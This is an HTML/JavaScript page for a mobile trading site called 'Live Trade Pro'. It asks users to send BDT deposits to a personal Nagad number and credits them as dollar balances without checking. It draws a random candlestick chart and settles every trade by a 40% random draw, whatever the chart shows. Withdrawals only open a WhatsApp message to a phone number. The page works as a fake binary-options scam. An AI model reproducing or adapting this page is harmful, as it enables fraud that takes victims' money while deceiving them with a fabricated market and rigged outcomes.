<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Live Trade Pro</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
  font-family: 'Segoe UI', Arial, sans-serif;
  background: #0e1012;
  color: #fff;
  overflow-x: hidden;
}
.header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 12px 15px;
  background: #1a1d21;
  position: sticky;
  top: 0;
  z-index: 10;
}
.balances {
  display: flex;
  gap: 20px;
}
.balance {
  font-size: 15px;
  font-weight: 600;
}
.balance span { color: #2ecc71; }
.profit span { color: #f39c12; }
.btn {
  padding: 8px 16px;
  border: none;
  border-radius: 6px;
  cursor: pointer;
  font-weight: 600;
  font-size: 14px;
}
.deposit { background: #2ecc71; color: #fff; }
.withdraw { background: #e74c3c; color: #fff; }

.overlay {
  display: none;
  position: fixed;
  top: 0; left: 0;
  width: 100%; height: 100%;
  background: rgba(0,0,0,0.6);
  z-index: 20;
}
.box {
  padding: 20px;
  background: #1a1d21;
  margin: 100px 15px;
  border-radius: 10px;
  display: none;
  position: relative;
  z-index: 21;
}
.box h3 { margin-bottom: 10px; }
label {
  font-size: 13px;
  color: #8b949e;
  display: block;
  margin-top: 12px;
}
input, select {
  padding: 12px;
  border-radius: 6px;
  border: 1px solid #2c2f33;
  background: #0e1012;
  color: #fff;
  width: 100%;
  margin: 8px 0;
  font-size: 15px;
}
.note { font-size: 13px; color: #8b949e; margin: 8px 0; }

.chart-area {
  position: relative;
  height: 320px;
  background: #0e1012;
  border-top: 1px solid #2c2f33;
  border-bottom: 1px solid #2c2f33;
  overflow: hidden;
}
.grid {
  position: absolute;
  width: 100%;
  height: 100%;
}
.grid-line {
  position: absolute;
  width: 100%;
  height: 1px;
  background: #1f2328;
}
.price-label {
  position: absolute;
  right: 8px;
  font-size: 11px;
  color: #8b949e;
}
.candle {
  position: absolute;
  bottom: 0;
  width: 8px;
}
.candle-body {
  width: 8px;
  position: absolute;
}
.green { background: #2ecc71; }
.red { background: #e74c3c; }
.wick {
  width: 1px;
  background: #666;
  position: absolute;
}
.entry-line {
  position: absolute;
  width: 100%;
  height: 1px;
  border-top: 1px dashed #f39c12;
}
.entry-label {
  position: absolute;
  right: 8px;
  background: #f39c12;
  color: #000;
  padding: 2px 6px;
  font-size: 11px;
  border-radius: 3px;
  font-weight: 600;
}
.end-line {
  position: absolute;
  width: 1px;
  height: 100%;
  border-left: 1px dashed #fff;
  opacity: 0.3;
}

.control-bar {
  padding: 15px;
  background: #1a1d21;
}
.timer-row {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 15px;
  gap: 10px;
}
.timer {
  font-size: 24px;
  color: #f39c12;
  font-weight: 700;
}
.trade-btns {
  display: flex;
  gap: 12px;
}
.up { background: #2ecc71; flex: 1; padding: 16px; font-size: 17px; border-radius: 8px; }
.down { background: #e74c3c; flex: 1; padding: 16px; font-size: 17px; border-radius: 8px; }
.history {
  padding: 15px;
  max-height: 200px;
  overflow-y: auto;
  font-size: 13px;
  background: #0e1012;
}
.history p { margin: 6px 0; color: #c9d1d9; }
.close-btn {
  position: absolute;
  top: 10px;
  right: 15px;
  background: none;
  border: none;
  color: #fff;
  font-size: 22px;
  cursor: pointer;
}
</style>
</head>
<body>

<div class="header">
  <div class="balances">
    <div class="balance">Balance: <span id="balance">$0.00</span></div>
    <div class="profit">Win: <span id="profit">$0.00</span></div>
  </div>
  <div>
    <button class="btn deposit" onclick="openBox('depositBox')">Deposit</button>
    <button class="btn withdraw" onclick="openBox('withdrawBox')">Withdraw</button>
  </div>
</div>

<div class="overlay" id="overlay" onclick="closeBox()"></div>

<div id="depositBox" class="box">
  <button class="close-btn" onclick="closeBox()">×</button>
  <h3>Deposit</h3>
  <p class="note">Minimum 900 BDT. Send to Nagad: <b>01819811370</b></p>
  <label>Amount BDT</label>
  <input type="number" id="depositAmount" placeholder="Enter amount">
  <label>Last 4 digit of sender number</label>
  <input type="text" id="last4" placeholder="1234" maxlength="4">
  <button class="btn deposit" onclick="deposit()">Confirm Deposit</button>
</div>

<div id="withdrawBox" class="box">
  <button class="close-btn" onclick="closeBox()">×</button>
  <h3>Withdraw</h3>
  <input type="number" id="withdrawAmount" placeholder="Amount USD">
  <input type="text" id="withdrawNumber" placeholder="Nagad Number">
  <p class="note">Amount will be deducted from Balance & Win Balance both</p>
  <button class="btn withdraw" onclick="withdraw()">Confirm Withdraw</button>
</div>

<div class="chart-area" id="chart">
  <div class="grid" id="grid"></div>
</div>

<div class="control-bar">
  <div class="timer-row">
    <div class="timer" id="timer">30s</div>
    <select id="timeSelect" onchange="changeTime()" style="width: 110px;">
      <option value="30">30s</option>
      <option value="60">60s</option>
      <option value="600">10min</option>
    </select>
    <select id="amount" style="width: 110px;">
      <option value="10">$10</option>
      <option value="20">$20</option>
      <option value="50">$50</option>
      <option value="100">$100</option>
    </select>
  </div>
  <div class="trade-btns">
    <button class="btn up" onclick="trade('up')">UP ▲</button>
    <button class="btn down" onclick="trade('down')">DOWN ▼</button>
  </div>
</div>

<div class="history">
  <h4>History</h4>
  <div id="history"></div>
</div>

<script>
let balance = localStorage.getItem('balance') ? parseFloat(localStorage.getItem('balance')) : 0;
let profit = localStorage.getItem('profit') ? parseFloat(localStorage.getItem('profit')) : 0;
let history = JSON.parse(localStorage.getItem('history')) || [];
let tradeTime = 30;
let timerInterval;
let candles = [];
let currentPrice = 184.500;
let activeTrade = null;

function updateUI() {
  document.getElementById('balance').innerText = '$' + balance.toFixed(2);
  document.getElementById('profit').innerText = '$' + profit.toFixed(2);
  document.getElementById('history').innerHTML = history.map(h => `<p>${h}</p>`).join('');
  localStorage.setItem('balance', balance);
  localStorage.setItem('profit', profit);
  localStorage.setItem('history', JSON.stringify(history));
}

function openBox(id) {
  document.getElementById('overlay').style.display = 'block';
  document.getElementById(id).style.display = 'block';
}

function closeBox() {
  document.getElementById('overlay').style.display = 'none';
  document.getElementById('depositBox').style.display = 'none';
  document.getElementById('withdrawBox').style.display = 'none';
}

function deposit() {
  let amt = parseFloat(document.getElementById('depositAmount').value);
  let last4 = document.getElementById('last4').value;
  if(!amt || amt < 900) { alert('Minimum deposit 900 BDT'); return; }
  if(!last4 || last4.length != 4) { alert('Enter last 4 digits'); return; }
  balance += amt;
  history.unshift(`Deposit: ${amt} BDT | Last4: ${last4}`);
  updateUI();
  alert('Deposit Successful!');
  document.getElementById('depositAmount').value = '';
  document.getElementById('last4').value = '';
  closeBox();
}

function withdraw() {
  let amt = parseFloat(document.getElementById('withdrawAmount').value);
  let num = document.getElementById('withdrawNumber').value;
  let total = balance + profit;
  
  if(!amt || amt <= 0 || amt > total) { 
    alert('Invalid amount. Available: $' + total.toFixed(2)); 
    return; 
  }
  if(!num) { alert('Enter Nagad number'); return; }
  
  let ratio = amt / total;
  balance -= balance * ratio;
  profit -= profit * ratio;
  
  history.unshift(`Withdraw: $${amt} to ${num}`);
  updateUI();
  
  let msg = `Withdraw Request\nAmount: $${amt}\nNagad Number: ${num}`;
  window.open(`https://wa.me/601123192967?text=${encodeURIComponent(msg)}`, '_blank');
  
  document.getElementById('withdrawAmount').value = '';
  document.getElementById('withdrawNumber').value = '';
  closeBox();
}

function changeTime() {
  tradeTime = parseInt(document.getElementById('timeSelect').value);
  document.getElementById('timer').innerText = tradeTime >= 60 ? tradeTime/60 + 'min' : tradeTime + 's';
}

function drawGrid() {
  let grid = document.getElementById('grid');
  grid.innerHTML = '';
  for(let i=0; i<5; i++) {
    let line = document.createElement('div');
    line.className = 'grid-line';
    line.style.top = i * 64 + 'px';
    grid.appendChild(line);
    
    let label = document.createElement('div');
    label.className = 'price-label';
    label.style.top = i * 64 - 8 + 'px';
    label.innerText = (currentPrice + (2-i)*0.05).toFixed(3);
    grid.appendChild(label);
  }
}

function drawCandle() {
  let change = (Math.random() - 0.48) * 0.03;
  currentPrice += change;
  let isGreen = change >= 0;
  let bodyHeight = Math.abs(change) * 800 + 20;
  let wickHeight = bodyHeight + Math.random() * 15;
  
  candles.push({price: currentPrice, green: isGreen, bodyHeight, wickHeight});
  if(candles.length > 35) candles.shift();
  
  let chart = document.getElementById('chart');
  chart.querySelectorAll('.candle').forEach(c => c.remove());
  
  candles.forEach((c, i) => {
    let div = document.createElement('div');
    div.className = 'candle';
    div.style.left = i * 15 + 25 + 'px';
    
    let wick = document.createElement('div');
    wick.className = 'wick';
    wick.style.height = c.wickHeight + 'px';
    wick.style.bottom = '0px';
    div.appendChild(wick);
    
    let body = document.createElement('div');
    body.className = 'candle-body ' + (c.green ? 'green' : 'red');
    body.style.height = c.bodyHeight + 'px';
    body.style.bottom = (c.wickHeight - c.bodyHeight)/2 + 'px';
    div.appendChild(body);
    
    chart.appendChild(div);
  });
  
  drawGrid();
}

function startTimer() {
  let timeLeft = tradeTime;
  document.getElementById('timer').innerText = timeLeft + 's';
  clearInterval(timerInterval);
  timerInterval = setInterval(() => {
    timeLeft--;
    document.getElementById('timer').innerText = timeLeft + 's';
    if(timeLeft <= 0) {
      clearInterval(timerInterval);
      endTrade();
    }
  }, 1000);
}

function trade(type) {
  if(activeTrade) { alert('Trade already running'); return; }
  let amt = parseFloat(document.getElementById('amount').value);
  if(amt > balance) { alert('Insufficient balance'); return; }
  
  activeTrade = {type, amount: amt};
  balance -= amt;
  updateUI();
  
  let chart = document.getElementById('chart');
  let line = document.createElement('div');
  line.className = 'entry-line';
  line.id = 'entryLine';
  line.style.top = '150px';
  chart.appendChild(line);
  
  let label = document.createElement('div');
  label.className = 'entry-label';
  label.id = 'entryLabel';
  label.innerText = type.toUpperCase();
  label.style.top = '138px';
  chart.appendChild(label);
  
  let endLine = document.createElement('div');
  endLine.className = 'end-line';
  endLine.style.left = candles.length * 15 + 25 + 'px';
  chart.appendChild(endLine);
  
  startTimer();
}

function endTrade() {
  if(!activeTrade) return;
  let win = Math.random() < 0.4;
  let result = '';
  
  if(win) {
    let profitAmt = activeTrade.amount * 0.6;
    profit += profitAmt;
    result = `${activeTrade.type.toUpperCase()}: $${activeTrade.amount} - WIN +$${profitAmt.toFixed(2)}`;
  } else {
    result = `${activeTrade.type.toUpperCase()}: $${activeTrade.amount} - LOSE -$${activeTrade.amount}`;
  }
  
  history.unshift(result);
  updateUI();
  activeTrade = null;
  
  document.getElementById('entryLine')?.remove();
  document.getElementById('entryLabel')?.remove();
}

setInterval(drawCandle, 800);
drawCandle();
drawGrid();
updateUI();
</script>

</body>
</html>
